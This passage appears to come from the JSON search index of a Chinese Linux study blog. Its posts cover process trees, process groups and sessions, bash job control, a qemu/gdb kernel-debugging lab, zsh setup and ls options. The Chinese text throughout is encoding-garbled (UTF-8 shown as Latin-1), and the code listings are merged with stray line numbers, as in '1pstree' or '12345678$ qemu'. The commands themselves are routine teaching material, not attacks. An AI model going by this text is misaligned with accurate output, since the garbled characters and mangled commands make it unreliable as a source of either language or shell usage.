çš„å­è¿›ç¨‹ã€‚ç”± init æ¥åšå–„åå¤„ç†ï¼Œæ‰€ä»¥å®ƒå¹¶ä¸è‡³äºåƒåƒµå°¸è¿›ç¨‹é‚£æ ·æ— äººé—®æ´¥ï¼Œä¸ç®¡ä¸é¡¾ï¼Œå¤§é‡å­˜åœ¨ä¼šæœ‰å±å®³ã€‚ è¿›ç¨‹ 0 æ˜¯ç³»ç»Ÿå¼•å¯¼æ—¶åˆ›å»ºçš„ä¸€ä¸ªç‰¹æ®Šè¿›ç¨‹ï¼Œä¹Ÿç§°ä¹‹ä¸ºå†…æ ¸åˆå§‹åŒ–ï¼Œå…¶æœ€åä¸€ä¸ªåŠ¨ä½œå°±æ˜¯è°ƒç”¨ fork() åˆ›å»ºå‡ºä¸€ä¸ªå­è¿›ç¨‹è¿è¡Œ /sbin/init å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè€Œè¯¥è¿›ç¨‹å°±æ˜¯ PID=1 çš„è¿›ç¨‹ 1ï¼Œè€Œè¿›ç¨‹ 0 å°±è½¬ä¸ºäº¤æ¢è¿›ç¨‹ï¼ˆä¹Ÿè¢«ç§°ä¸ºç©ºé—²è¿›ç¨‹ï¼‰ï¼Œè¿›ç¨‹ 1 ï¼ˆinit è¿›ç¨‹ï¼‰æ˜¯ç¬¬ä¸€ä¸ªç”¨æˆ·æ€çš„è¿›ç¨‹ï¼Œå†ç”±å®ƒä¸æ–­è°ƒç”¨ fork() æ¥åˆ›å»ºç³»ç»Ÿé‡Œå…¶ä»–çš„è¿›ç¨‹ï¼Œæ‰€ä»¥å®ƒæ˜¯æ‰€æœ‰è¿›ç¨‹çš„çˆ¶è¿›ç¨‹æˆ–è€…ç¥–å…ˆè¿›ç¨‹ã€‚åŒæ—¶å®ƒæ˜¯ä¸€ä¸ªå®ˆæŠ¤ç¨‹åºï¼Œç›´åˆ°è®¡ç®—æœºå…³æœºæ‰ä¼šåœæ­¢ã€‚ é€šè¿‡ä»¥ä¸‹çš„å‘½ä»¤æˆ‘ä»¬å¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°è¿™æ ·çš„ç»“æ„ 1pstree æˆ–è€…ä»æ­¤å›¾æˆ‘ä»¬å¯ä»¥æ›´åŠ å½¢è±¡çš„çœ‹æ¸…å­çˆ¶è¿›ç¨‹çš„å…³ç³» é€šè¿‡ä»¥ä¸Šçš„æ˜¾ç¤ºç»“æœæˆ‘ä»¬å¯ä»¥çœ‹çš„å¾ˆæ¸…æ¥šï¼Œinit ä¸ºæ‰€æœ‰è¿›ç¨‹çš„çˆ¶è¿›ç¨‹æˆ–è€…è¯´æ˜¯ç¥–å…ˆè¿›ç¨‹ æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨è¿™æ ·ä¸€ä¸ªå‘½ä»¤æ¥çœ‹ï¼Œå…¶ä¸­ pid å°±æ˜¯è¯¥è¿›ç¨‹çš„ä¸€ä¸ªå”¯ä¸€ç¼–å·ï¼Œppid å°±æ˜¯è¯¥è¿›ç¨‹çš„çˆ¶è¿›ç¨‹çš„ pidï¼Œcommand è¡¨ç¤ºçš„æ˜¯è¯¥è¿›ç¨‹é€šè¿‡æ‰§è¡Œä»€ä¹ˆæ ·çš„å‘½ä»¤æˆ–è€…è„šæœ¬è€Œäº§ç”Ÿçš„ 1ps ï¼fxo user,ppid,pid,pgid,command å¯ä»¥åœ¨å›¾ä¸­çœ‹è§æˆ‘ä»¬æ‰§è¡Œçš„ ps å°±æ˜¯ç”± zsh é€šè¿‡ fork-exec åˆ›å»ºçš„å­è¿›ç¨‹è€Œæ‰§è¡Œçš„ ä½¿ç”¨è¿™æ ·çš„ä¸€ä¸ªå‘½ä»¤æˆ‘ä»¬ä¹Ÿèƒ½æ¸…æ¥šçš„çœ‹è§ init å¦‚ä¸Šæ–‡æ‰€è¯´æ˜¯ç”±è¿›ç¨‹ 0 è¿™ä¸ªåˆå§‹åŒ–è¿›ç¨‹æ¥åˆ›å»ºå‡ºæ¥çš„å­è¿›ç¨‹ï¼Œè€Œå…¶ä»–çš„è¿›ç¨‹åŸºæœ¬æ˜¯ç”± init åˆ›å»ºçš„å­è¿›ç¨‹ï¼Œæˆ–è€…æ˜¯ç”±å®ƒçš„å­è¿›ç¨‹åˆ›å»ºå‡ºæ¥çš„å­è¿›ç¨‹ã€‚æ‰€ä»¥ init æ˜¯ç”¨æˆ·è¿›ç¨‹çš„ç¬¬ä¸€ä¸ªè¿›ç¨‹ä¹Ÿæ˜¯æ‰€æœ‰ç”¨æˆ·è¿›ç¨‹çš„çˆ¶è¿›ç¨‹æˆ–è€…ç¥–å…ˆè¿›ç¨‹ã€‚ï¼ˆps å‘½ä»¤å°†åœ¨åç»­è¯¾ç¨‹è¯¦è§£ï¼‰ å°±åƒä¸€ä¸ªæ ‘çŠ¶å›¾ï¼Œè€Œ init è¿›ç¨‹å°±æ˜¯è¿™æ£µæ ‘çš„æ ¹ï¼Œå…¶ä»–è¿›ç¨‹ç”±æ ¹ä¸æ–­çš„å‘æ•£ï¼Œå¼€ææ•£å¶ 2.3 è¿›ç¨‹ç»„ä¸Sessions æ¯ä¸€ä¸ªè¿›ç¨‹éƒ½ä¼šæ˜¯ä¸€ä¸ªè¿›ç¨‹ç»„çš„æˆå‘˜ï¼Œè€Œä¸”è¿™ä¸ªè¿›ç¨‹ç»„æ˜¯å”¯ä¸€å­˜åœ¨çš„ï¼Œä»–ä»¬æ˜¯ä¾é  PGIDï¼ˆprocess group IDï¼‰æ¥åŒºåˆ«çš„ï¼Œè€Œæ¯å½“ä¸€ä¸ªè¿›ç¨‹è¢«åˆ›å»ºçš„æ—¶å€™ï¼Œå®ƒä¾¿ä¼šæˆä¸ºå…¶çˆ¶è¿›ç¨‹æ‰€åœ¨ç»„ä¸­çš„ä¸€å‘˜ã€‚ ä¸€èˆ¬æƒ…å†µï¼Œè¿›ç¨‹ç»„çš„ PGID ç­‰åŒäºè¿›ç¨‹ç»„çš„ç¬¬ä¸€ä¸ªæˆå‘˜çš„ PIDï¼Œå¹¶ä¸”è¿™æ ·çš„è¿›ç¨‹ç§°ä¸ºè¯¥è¿›ç¨‹ç»„çš„é¢†å¯¼è€…ï¼Œä¹Ÿå°±æ˜¯é¢†å¯¼è¿›ç¨‹ï¼Œè¿›ç¨‹ä¸€èˆ¬é€šè¿‡ä½¿ç”¨ getpgrp() ç³»ç»Ÿè°ƒç”¨æ¥å¯»æ‰¾å…¶æ‰€åœ¨ç»„çš„ PGIDï¼Œé¢†å¯¼è¿›ç¨‹å¯ä»¥å…ˆç»ˆç»“ï¼Œæ­¤æ—¶è¿›ç¨‹ç»„ä¾ç„¶å­˜åœ¨ï¼Œå¹¶æŒæœ‰ç›¸åŒçš„ PGIDï¼Œç›´åˆ°è¿›ç¨‹ç»„ä¸­æœ€åä¸€ä¸ªè¿›ç¨‹ç»ˆç»“ã€‚ ä¸è¿›ç¨‹ç»„ç±»ä¼¼ï¼Œæ¯å½“ä¸€ä¸ªè¿›ç¨‹è¢«åˆ›å»ºçš„æ—¶å€™ï¼Œå®ƒä¾¿ä¼šæˆä¸ºå…¶çˆ¶è¿›ç¨‹æ‰€åœ¨ Session ä¸­çš„ä¸€å‘˜ï¼Œæ¯ä¸€ä¸ªè¿›ç¨‹ç»„éƒ½ä¼šåœ¨ä¸€ä¸ª Session ä¸­ï¼Œå¹¶ä¸”è¿™ä¸ª Session æ˜¯å”¯ä¸€å­˜åœ¨çš„ï¼Œ Session ä¸»è¦æ˜¯é’ˆå¯¹ä¸€ä¸ª tty å»ºç«‹ï¼ŒSession ä¸­çš„æ¯ä¸ªè¿›ç¨‹éƒ½ç§°ä¸ºä¸€ä¸ªå·¥ä½œ(job)ã€‚æ¯ä¸ªä¼šè¯å¯ä»¥è¿æ¥ä¸€ä¸ªç»ˆç«¯(control terminal)ã€‚å½“æ§åˆ¶ç»ˆç«¯æœ‰è¾“å…¥è¾“å‡ºæ—¶ï¼Œéƒ½ä¼ é€’ç»™è¯¥ä¼šè¯çš„å‰å°è¿›ç¨‹ç»„ã€‚Session æ„ä¹‰åœ¨äºå°†å¤šä¸ª jobs å›Šæ‹¬åœ¨ä¸€ä¸ªç»ˆç«¯ï¼Œå¹¶å–å…¶ä¸­çš„ä¸€ä¸ª job ä½œä¸ºå‰å°ï¼Œæ¥ç›´æ¥æ¥æ”¶è¯¥ç»ˆç«¯çš„è¾“å…¥è¾“å‡ºä»¥åŠç»ˆç«¯ä¿¡å·ã€‚ å…¶ä»– jobs åœ¨åå°è¿è¡Œã€‚ å‰å°ï¼ˆforegroundï¼‰å°±æ˜¯åœ¨ç»ˆç«¯ä¸­è¿è¡Œï¼Œèƒ½ä¸ä½ æœ‰äº¤äº’çš„ åå°ï¼ˆbackgroundï¼‰å°±æ˜¯åœ¨ç»ˆç«¯ä¸­è¿è¡Œï¼Œä½†æ˜¯ä½ å¹¶ä¸èƒ½ä¸å…¶ä»»ä½•çš„äº¤äº’ï¼Œä¹Ÿä¸ä¼šæ˜¾ç¤ºå…¶æ‰§è¡Œçš„è¿‡ç¨‹ 2.4 å·¥ä½œç®¡ç† bash(Bourne-Again shell)æ”¯æŒå·¥ä½œæ§åˆ¶ï¼ˆjob controlï¼‰ï¼Œè€Œ shï¼ˆBourne shellï¼‰å¹¶ä¸æ”¯æŒã€‚ å¹¶ä¸”æ¯ä¸ªç»ˆç«¯æˆ–è€…è¯´ bash åªèƒ½ç®¡ç†å½“å‰ç»ˆç«¯ä¸­çš„ jobï¼Œä¸èƒ½ç®¡ç†å…¶ä»–ç»ˆç«¯ä¸­çš„ jobã€‚æ¯”å¦‚æˆ‘å½“å‰å­˜åœ¨ä¸¤ä¸ª bash åˆ†åˆ«ä¸º bash1ã€bash2ï¼Œbash1 åªèƒ½ç®¡ç†å…¶è‡ªå·±é‡Œé¢çš„ job å¹¶ä¸èƒ½ç®¡ç† bash2 é‡Œé¢çš„ job æˆ‘ä»¬éƒ½çŸ¥é“å½“ä¸€ä¸ªè¿›ç¨‹åœ¨å‰å°è¿ä½œæ—¶æˆ‘ä»¬å¯ä»¥ç”¨ ctrl + c æ¥ç»ˆæ­¢å®ƒï¼Œä½†æ˜¯è‹¥æ˜¯åœ¨åå°çš„è¯å°±ä¸è¡Œäº†ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡ &amp; è¿™ä¸ªç¬¦å·ï¼Œè®©æˆ‘ä»¬çš„å‘½ä»¤åœ¨åå°ä¸­è¿è¡Œï¼š 1ls &amp; å›¾ä¸­æ‰€æ˜¾ç¤ºçš„ [1] 236åˆ†åˆ«æ˜¯è¯¥ job çš„ job number ä¸è¯¥è¿›ç¨‹çš„ PIDï¼Œè€Œæœ€åä¸€è¡Œçš„ Done è¡¨ç¤ºè¯¥å‘½ä»¤å·²ç»åœ¨åå°æ‰§è¡Œå®Œæ¯•ã€‚ æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ ctrl + z ä½¿æˆ‘ä»¬çš„å½“å‰å·¥ä½œåœæ­¢å¹¶ä¸¢åˆ°åå°ä¸­å» è¢«åœæ­¢å¹¶æ”¾ç½®åœ¨åå°çš„å·¥ä½œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‘½ä»¤æ¥æŸ¥çœ‹ï¼š 1jobs å…¶ä¸­ç¬¬ä¸€åˆ—æ˜¾ç¤ºçš„ä¸ºè¢«æ”¾ç½®åå° job çš„ç¼–å·ï¼Œè€Œç¬¬äºŒåˆ—çš„ ï¼‹ è¡¨ç¤ºæœ€è¿‘(åˆšåˆšã€æœ€å)è¢«æ”¾ç½®åå°çš„ jobï¼ŒåŒæ—¶ä¹Ÿè¡¨ç¤ºé¢„è®¾çš„å·¥ä½œï¼Œä¹Ÿå°±æ˜¯è‹¥æ˜¯æœ‰ä»€ä¹ˆé’ˆå¯¹åå° job çš„æ“ä½œï¼Œé¦–å…ˆå¯¹é¢„è®¾çš„ jobï¼Œ- è¡¨ç¤ºå€’æ•°ç¬¬äºŒï¼ˆä¹Ÿå°±æ˜¯åœ¨é¢„è®¾ä¹‹å‰çš„ä¸€ä¸ªï¼‰è¢«æ”¾ç½®åå°çš„å·¥ä½œï¼Œå€’æ•°ç¬¬ä¸‰ä¸ªï¼ˆå†ä¹‹å‰çš„ï¼‰ä»¥åéƒ½ä¸ä¼šæœ‰è¿™æ ·çš„ç¬¦å·ä¿®é¥°ï¼Œç¬¬ä¸‰åˆ—è¡¨ç¤ºå®ƒä»¬çš„çŠ¶æ€ï¼Œè€Œæœ€åä¸€åˆ—è¡¨ç¤ºè¯¥è¿›ç¨‹æ‰§è¡Œçš„å‘½ä»¤ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™æ ·çš„ä¸€ä¸ªå‘½ä»¤å°†åå°çš„å·¥ä½œæ‹¿åˆ°å‰å°æ¥ï¼š 123# åé¢ä¸åŠ å‚æ•°æå–é¢„è®¾å·¥ä½œï¼ŒåŠ å‚æ•°æå–æŒ‡å®šå·¥ä½œçš„ç¼–å·# ubuntu åœ¨ zsh ä¸­éœ€è¦ %ï¼Œåœ¨ bash ä¸­ä¸éœ€è¦ %fg [%jobnumber] ä¹‹å‰æˆ‘ä»¬é€šè¿‡ ctrl + z ä½¿å¾—å·¥ä½œåœæ­¢æ”¾ç½®åœ¨åå°ï¼Œè‹¥æ˜¯æˆ‘ä»¬æƒ³è®©å…¶åœ¨åå°è¿ä½œæˆ‘ä»¬å°±ä½¿ç”¨è¿™æ ·ä¸€ä¸ªå‘½ä»¤ï¼š 12#ä¸fgç±»ä¼¼ï¼ŒåŠ å‚åˆ™æŒ‡å®šï¼Œä¸åŠ å‚åˆ™å–é¢„è®¾bg [%jobnumber] æ—¢ç„¶æœ‰æ–¹æ³•å°†è¢«æ”¾ç½®åœ¨åå°çš„å·¥ä½œæè‡³å‰å°æˆ–è€…è®©å®ƒä»åœæ­¢å˜æˆç»§ç»­è¿è¡Œåœ¨åå°ï¼Œå½“ç„¶ä¹Ÿæœ‰æ–¹æ³•åˆ é™¤ä¸€ä¸ªå·¥ä½œï¼Œæˆ–è€…é‡å¯ç­‰ç­‰ã€‚ 12345# killçš„ä½¿ç”¨æ ¼å¼å¦‚ä¸‹kill -signal %jobnumber# signalä»1-64ä¸ªä¿¡å·å€¼å¯ä»¥é€‰æ‹©ï¼Œå¯ä»¥è¿™æ ·æŸ¥çœ‹kill ï¼l å…¶ä¸­å¸¸ç”¨çš„æœ‰è¿™äº›ä¿¡å·å€¼ ä¿¡å·å€¼ ä½œç”¨ -1 é‡æ–°è¯»å–å‚æ•°è¿è¡Œï¼Œç±»ä¼¼ä¸ restart -2 å¦‚åŒ ctrl+c çš„æ“ä½œé€€å‡º -9 å¼ºåˆ¶ç»ˆæ­¢è¯¥ä»»åŠ¡ -15 æ­£å¸¸çš„æ–¹å¼ç»ˆæ­¢è¯¥ä»»åŠ¡ è‹¥æ˜¯åœ¨ä½¿ç”¨ kill ï¼‹ä¿¡å·å€¼ç„¶åç›´æ¥åŠ  pidï¼Œä½ å°†ä¼šå¯¹ pid å¯¹åº”çš„è¿›ç¨‹è¿›è¡Œæ“ä½œã€‚ è‹¥æ˜¯åœ¨ä½¿ç”¨ kill+ä¿¡å·å€¼ç„¶å ï¼…jobnumberï¼Œè¿™æ—¶æ‰€æ“ä½œçš„å¯¹è±¡æ˜¯ jobï¼Œè¿™ä¸ªæ•°å­—å°±æ˜¯å°±å½“å‰ bash ä¸­åå°çš„è¿è¡Œçš„ job çš„ IDã€‚","tags":[{"name":"Linux","slug":"Linux","permalink":"https://hodlyounger.github.io/tags/Linux/"},{"name":"è¿›ç¨‹ä¸ç¨‹åº","slug":"è¿›ç¨‹ä¸ç¨‹åº","permalink":"https://hodlyounger.github.io/tags/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%A8%8B%E5%BA%8F/"},{"name":"è¿›ç¨‹çš„è¡ç”Ÿ","slug":"è¿›ç¨‹çš„è¡ç”Ÿ","permalink":"https://hodlyounger.github.io/tags/%E8%BF%9B%E7%A8%8B%E7%9A%84%E8%A1%8D%E7%94%9F/"},{"name":"å·¥ä½œç®¡ç†","slug":"å·¥ä½œç®¡ç†","permalink":"https://hodlyounger.github.io/tags/%E5%B7%A5%E4%BD%9C%E7%AE%A1%E7%90%86/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"LinuxåŸºç¡€å…¥é—¨","slug":"A-OS/Linux/LinuxåŸºç¡€å…¥é—¨","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Linux%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]},{"title":"Linux å†…æ ¸åˆ†æé…å¥—å®éªŒ","date":"2023-10-27T01:24:01.842Z","path":"A_OS/Linux/Linuxå†…æ ¸åˆ†æé…å¥—å®éªŒ/Readme/","text":"linux å†…æ ¸åˆ†æé…å¥—å®éªŒå­¦ä¹ è®°å½• æœ¬èŠ‚è®°å½•å®éªŒæ¥¼Linuxå†…æ ¸å­¦ä¹ è®°å½• 1 å®Œæˆä¸€ä¸ªç®€å•çš„æ—¶é—´ç‰‡è½®è½¬èº²åˆ°ç¨‹åºå†…æ ¸ä»£ç  2 è·Ÿè¸ªåˆ†æLinuxå†…æ ¸çš„å¯åŠ¨è¿‡ç¨‹","tags":[{"name":"Linux","slug":"Linux","permalink":"https://hodlyounger.github.io/tags/Linux/"},{"name":"å†…æ ¸","slug":"å†…æ ¸","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"Linuxå†…æ ¸åˆ†æé…å¥—å®éªŒ","slug":"A-OS/Linux/Linuxå†…æ ¸åˆ†æé…å¥—å®éªŒ","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/"}]},{"title":"Linuxå†…æ ¸2 è·Ÿè¸ªåˆ†æLinuxå†…æ ¸çš„å¯åŠ¨è¿‡ç¨‹","date":"2023-10-27T01:24:01.841Z","path":"A_OS/Linux/Linuxå†…æ ¸åˆ†æé…å¥—å®éªŒ/2 è·Ÿè¸ªåˆ†æLinuxå†…æ ¸çš„å¯åŠ¨è¿‡ç¨‹/","text":"ä½¿ç”¨å®éªŒæ¥¼çš„è™šæ‹Ÿæœºæ‰“å¼€ shell 12cd ~/LinuxKernel/qemu -kernel linux-3.18.6/arch/x86/boot/bzImage -initrd rootfs.img å†…æ ¸å¯åŠ¨å®Œæˆåè¿›å…¥ menuç¨‹åºï¼ˆã€Šè½¯ä»¶å·¥ç¨‹ C ç¼–ç å®è·µç¯‡ã€‹çš„è¯¾ç¨‹é¡¹ç›®ï¼‰ï¼Œæ”¯æŒä¸‰ä¸ªå‘½ä»¤ helpã€version å’Œ quitï¼Œæ‚¨ä¹Ÿå¯ä»¥æ·»åŠ æ›´å¤šçš„å‘½ä»¤ï¼Œå¯¹é€‰ä¿®è¿‡ã€Šè½¯ä»¶å·¥ç¨‹ C ç¼–ç å®è·µç¯‡ã€‹çš„ç«¥é‹åº”è¯¥æ˜¯ a piece of cake. ä½¿ç”¨ gdb è·Ÿè¸ªè°ƒè¯•å†…æ ¸ 12345678$ qemu -kernel linux-3.18.6/arch/x86/boot/bzImage -initrd rootfs.img -s -S# å…³äº-så’Œ-Sé€‰é¡¹çš„è¯´æ˜ï¼š# 1. -S# -S freeze CPU at startup (use â€™câ€™ to start execution)# 2. -s# -s shorthand for -gdb tcp::1234# è‹¥ä¸æƒ³ä½¿ç”¨1234ç«¯å£ï¼Œåˆ™å¯ä»¥ä½¿ç”¨-gdb tcp:xxxxæ¥å–ä»£-sé€‰é¡¹ å¦å¼€ä¸€ä¸ª shell çª—å£ 12345678910111213# æ‰“å¼€ GDB è°ƒè¯•å™¨$ gdb# åœ¨ GDB ä¸­è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š# åœ¨gdbç•Œé¢ä¸­targe remoteä¹‹å‰åŠ è½½ç¬¦å·è¡¨ï¼ˆgdbï¼‰file linux-3.18.6/vmlinux# å»ºç«‹gdbå’Œgdbserverä¹‹é—´çš„è¿æ¥,æŒ‰c è®©qemuä¸Šçš„Linuxç»§ç»­è¿è¡Œï¼ˆgdbï¼‰target remote:1234# æ–­ç‚¹çš„è®¾ç½®å¯ä»¥åœ¨target remoteä¹‹å‰ï¼Œä¹Ÿå¯ä»¥åœ¨ä¹‹åï¼ˆgdbï¼‰break start_kernel","tags":[{"name":"Linux","slug":"Linux","permalink":"https://hodlyounger.github.io/tags/Linux/"},{"name":"å†…æ ¸","slug":"å†…æ ¸","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"Linuxå†…æ ¸åˆ†æé…å¥—å®éªŒ","slug":"A-OS/Linux/Linuxå†…æ ¸åˆ†æé…å¥—å®éªŒ","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/"}]},{"title":"ã€Linuxã€‘ç»ˆç«¯å·¥å…·â€”â€”zsh","date":"2023-10-27T01:24:01.840Z","path":"A_OS/Linux/Command&Tools/ã€Linuxã€‘ç»ˆç«¯å·¥å…·â€”â€”zsh/","text":"æ¦‚è¿°ï¼šLinuxç»ˆç«¯å·¥å…· zsh çš„å®‰è£…ä¸é…ç½® [toc] zshå®‰è£… æŸ¥çœ‹å½“å‰ç³»ç»Ÿè£…äº†å“ªäº›shell 1cat /etc/shell å½“å‰æ­£åœ¨è¿è¡Œçš„æ˜¯å“ªä¸ªç‰ˆæœ¬çš„shell 1echo $SHELL å®‰è£…zsh 1sudo apt-get -y install zsh åˆ‡æ¢zsh 1chsh -s /bin/zshï¼ˆéå®æ—¶ï¼Œéœ€é‡å¯ï¼‰ æŸ¥çœ‹zshçš„ä¸»é¢˜æœ‰å“ªäº› 1ls ~/.oh-my-zsh/themes/","tags":[{"name":"linux","slug":"linux","permalink":"https://hodlyounger.github.io/tags/linux/"},{"name":"shell","slug":"shell","permalink":"https://hodlyounger.github.io/tags/shell/"},{"name":"zsh","slug":"zsh","permalink":"https://hodlyounger.github.io/tags/zsh/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"Command&Tools","slug":"A-OS/Linux/Command-Tools","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Command-Tools/"}]},{"title":"linux å†…æ ¸1 å®Œæˆä¸€ä¸ªç®€å•çš„æ—¶é—´ç‰‡è½®è½¬èº²åˆ°ç¨‹åºå†…æ ¸ä»£ç ","date":"2023-10-27T01:24:01.840Z","path":"A_OS/Linux/Linuxå†…æ ¸åˆ†æé…å¥—å®éªŒ/1 å®Œæˆä¸€ä¸ªç®€å•çš„æ—¶é—´ç‰‡è½®è½¬èº²åˆ°ç¨‹åºå†…æ ¸ä»£ç /","text":"ä½¿ç”¨å®éªŒæ¥¼çš„è™šæ‹Ÿæœºæ‰“å¼€ shell 12345678910111213# æ³¨æ„è·¯å¾„æ˜¯åŒºåˆ†å¤§å°çš„$ cd ~/LinuxKernel/linux-3.9.4$ rm -rf mykernel$ patch -p1 &lt; ../mykernel_for_linux3.9.4sc.patch$ make allnoconfig# ç¼–è¯‘å†…æ ¸è¯·è€å¿ƒç­‰å¾…$ make$ qemu -kernel arch/x86/boot/bzImage ç„¶å cd mykernel æ‚¨å¯ä»¥çœ‹åˆ° qemu çª—å£è¾“å‡ºçš„å†…å®¹çš„ä»£ç  mymain.c å’Œ myinterrupt.c æ³¨æ„ï¼šä¿®æ”¹ä»£ç åéœ€è¦ make é‡æ–°ç¼–è¯‘ä¹‹åæ‰èƒ½ç”Ÿæ•ˆå“¦ã€‚ ä½¿ç”¨è‡ªå·±çš„ Linux ç³»ç»Ÿç¯å¢ƒæ­å»ºè¿‡ç¨‹å‚è§ mykernelï¼Œå…¶ä¸­ä¹Ÿå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªç®€å•çš„æ—¶é—´ç‰‡è½®è½¬å¤šé“ç¨‹åºå†…æ ¸ä»£ç ","tags":[{"name":"linux","slug":"linux","permalink":"https://hodlyounger.github.io/tags/linux/"},{"name":"å†…æ ¸","slug":"å†…æ ¸","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"Linuxå†…æ ¸åˆ†æé…å¥—å®éªŒ","slug":"A-OS/Linux/Linuxå†…æ ¸åˆ†æé…å¥—å®éªŒ","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/"}]},{"title":"ã€Linuxã€‘lså‘½ä»¤è¯¦è§£","date":"2023-10-27T01:24:01.838Z","path":"A_OS/Linux/Command&Tools/ã€Linuxã€‘ls/","text":"[toc] å‚æ•° ls :åˆ—å‡ºæ–‡ä»¶æˆ–è€…ç›®å½• -lï¼Œä½¿ç”¨é•¿æ ¼å¼æ˜¾ç¤º -aï¼Œæ˜¾ç¤ºæ–‡ä»¶åä»¥.å¼€å¤´çš„éšè—æ–‡ä»¶ -hï¼Œä»¥humanæ˜“è¯»æ ¼å¼æ˜¾ç¤ºï¼Œä¸»è¦æ˜¯çœ‹å®¹é‡çš„æ—¶å€™ä½¿ç”¨KB MB GBï¼ŒæŒ‡å½“å‰æ–‡ä»¶å¤¹ç›®å½•çš„å¤§å° -lh ,æ–‡ä»¶æˆ–è€…ç›®å½•å¤§å°çš„, æ–¹ä¾¿è¯†åˆ« -lhS ,æ–‡ä»¶ä»å¤§åˆ°å°æ’åº -lg ,ä¸æ‰“å°æ‰€æœ‰è€…ä¿¡æ¯ -ln ,æ‰“å°UIDå’ŒGID -l --si siä»¥1000ä¸ºå•ä½ï¼Œè€Œ-hä»¥1024ä¸ºå•ä½ã€‚ -l --block-size=M: è®¾ç½®æ–‡ä»¶æ˜¾ç¤ºå•ä½ -liï¼Œæ˜¾ç¤ºinodeå· -rï¼Œreverseï¼Œæ”¹å˜å½’ç±»çš„é¡ºåºï¼Œä¾‹å¦‚å’Œ-té…åˆä½¿ç”¨ï¼Œ-trå’Œ-tæ˜¾ç¤ºé¡ºåºæ˜¯é¢ å€’çš„ã€‚ -Rï¼Œé€’å½’åˆ—å‡ºå­ç›®å½• -lX/ -l --sort=extensionï¼šæ‰©å±•åæ’åº -tï¼ŒæŒ‰ç…§ä¿®æ”¹æ—¶é—´é¡ºåºå½’ç±»æ–‡ä»¶ã€‚ -dï¼Œåˆ—å‡ºç›®å½•æœ¬èº«çš„ä¿¡æ¯ï¼Œè€Œä¸æ˜¯ç›®å½•é‡Œè¾¹çš„å†…å®¹ã€‚ å­—èŠ‚ å­—èŠ‚ç›¸å…³å•ä½ï¼š K = Kilobyte åƒå­—èŠ‚ M = Megabyte å…†å­—èŠ‚ G = Gigabyte åäº¿å­—èŠ‚ T = Terabyte å…†å…†å­—èŠ‚ P = Petabyte 10çš„15æ¬¡æ–¹å­—èŠ‚ E = Exabyte è‰¾å­—èŠ‚ Z = Zettabyte æ³½å®ƒå­—èŠ‚æˆ–çš†å­—èŠ‚ Y = Yottabyte å°§å­—èŠ‚ å‘½ä»¤ -a: æ˜¾ç¤ºæ‰€æœ‰æ¡£æ¡ˆä»¥åŠç›®å½•ï¼ˆlså†…å®šå°†æ¡£æ¡ˆæˆ–ç›®å½•åç§°ä¸ºâ€œ./â€¦â€çš„è§†ä¸ºéšè—ï¼‰ -A: æ˜¾ç¤ºé™¤éšè—æ–‡ä»¶â€œ./â€¦â€ä»¥å¤–çš„æ‰€æœ‰æ–‡ä»¶åˆ—è¡¨ -b: å°†æ–‡ä»¶ä¸­çš„ä¸å¯è¾“å‡ºçš„å­—ç¬¦ä»¥åæ–œçº¿åŠ å­—ç¬¦ç¼–ç çš„æ–¹å¼è¾“å‡º -c : ä¸â€-ltâ€œ é€‰é¡¹è¿ç”¨æ—¶ï¼ŒæŒ‰ç…§æ–‡ä»¶çŠ¶æ€æ—¶é—´æ’åºè¾“å‡ºç›®å½•å†…å®¹ï¼Œ æ’åºçš„ä¾æ®æ˜¯æ–‡ä»¶çš„ç´¢å¼•èŠ‚ç‚¹ä¸­çš„ctime å­—æ®µã€‚ ä¸â€-lâ€œè¿ç”¨æ—¶ï¼Œæ’åºçš„ä¾æ®æ˜¯æ–‡ä»¶çš„çŠ¶æ€æ”¹å˜æ—¶é—´ã€‚ -C: å¤šåˆ—æ˜¾ç¤ºè¾“å‡ºç»“æœï¼ˆåªæœ‰æ–‡ä»¶åä¿¡æ¯ï¼‰ -d : 